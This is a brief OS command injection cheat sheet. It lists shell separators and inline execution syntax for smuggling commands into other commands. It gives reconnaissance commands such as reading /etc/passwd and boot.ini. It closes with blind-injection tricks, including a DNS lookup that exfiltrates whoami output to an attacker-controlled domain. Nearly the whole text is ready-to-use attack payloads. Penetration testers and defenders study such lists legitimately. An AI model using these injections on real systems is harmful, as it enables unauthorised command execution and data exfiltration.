characters for command separation:
    &
    &&
    |
    ||

only on Unix-based systems:

    ;
    Newline (0x0a or \n)

On Unix-based systems, also use the following to perform inline execution of an injected command within the original command:

    ` injected command `
    $( injected command )

--> Useful Commands (not blind OR using > to output in a readable file):

Win & unix:   whoami
Lin           cat /etc/passwd
Win           type C:\boot.ini
Lin           ifconfig
Win           ipconfig
Lin           uname -a
Win           ver

--> Useful commands when blind:
ping -c 10 myip   and monitor inteface
ping -c 10 127.0.0.1    and wait for delay
nslookup mydomain.com      and monitor the request (may use a subdomain to differentiate between requests)
nslookup `whoami`.mydomain.com      to exfiltrate command output
